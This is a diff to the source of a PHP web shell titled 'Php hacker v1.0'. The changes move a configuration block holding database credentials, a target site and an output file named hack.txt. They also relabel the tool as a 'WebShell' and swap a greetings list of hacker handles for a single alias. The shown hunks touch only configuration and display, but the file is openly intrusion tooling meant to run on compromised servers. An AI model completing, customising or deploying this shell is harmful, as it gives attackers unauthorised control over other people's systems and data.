@@ -3,6 +3,20 @@
 Script Name : Php hacker v1.0
 Written By Hussien Yousef					  
 ###########################################*/
+################# To be edited by the user ########################
+///////////////////////////////
+                             //
+$mysql_use = "no"; //"yes"   //
+$mhost = "localhost";        //
+$muser = "root";             //
+$mpass = "pass";             //
+$mdb = "name";               //
+$them = "xxx"; //any site    //
+$you = "xx"; //your username //
+$flib = "hack.txt";        //
+$folder = "hack.txt";      //
+///////////////////////////////
+############# DO NOT MODIFY FROM HERE ON ##################
 error_reporting(0); 
 set_magic_quotes_runtime(0);
 if(version_compare(phpversion(), '4.1.0') == -1)
@@ -65,22 +79,9 @@ $et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
 $c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
 $sta="<textarea cols=157 rows=23>";$eta="</textarea>";
 $sfnt="<font face=tahoma size=2 color=#008080>";$efnt="</font>";
-################# Editing By User ########################
-///////////////////////////////
-                             //
-$mysql_use = "no"; //"yes"   //
-$mhost = "localhost";        //
-$muser = "root";             //
-$mpass = "pass";             //
-$mdb = "name";               //
-$them = "xxx"; //any site    //
-$you = "xx"; //your username //
-$flib = "hack.txt";        //
-$folder = "hack.txt";      //
-///////////////////////////////
 ################# PhP Design (Start) ########################
-delm(": Php Hacker v1.0 (Shell) :");
-print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=white size=4>[ Php hacker v1.0 ]::[ Owned By Yourname ]
+delm(": Php Hacker v1.0 (WebShell) :");
+print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=white size=4>[ Php hacker v1.0 ]::[ :) ]
 </font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
 print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "<a href=".inclink('linux', 'greet').">Gr33tz To</a>";
 print " - <a href='javascript:history.back()'>Back</a>";
@@ -101,8 +102,7 @@ echo "<br>";
 if ($linux=='greet')
 {
 echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
-echo "GeNiUs HaCkEr & Blood Hacker & Mr.ALJoOoKeR & Dr_Whad_Drb & Saudi Hunter & Saudi Coder &  ROMANCY-HACKER & Qatil_Albasik & Caeser & KsA HaCkEr & Hacker Zero & Mr.Shares & Dr.Shares
-";
+echo "Alph4W0lf";
   echo "</textarea>";
 }
 // read file unzend sorce //
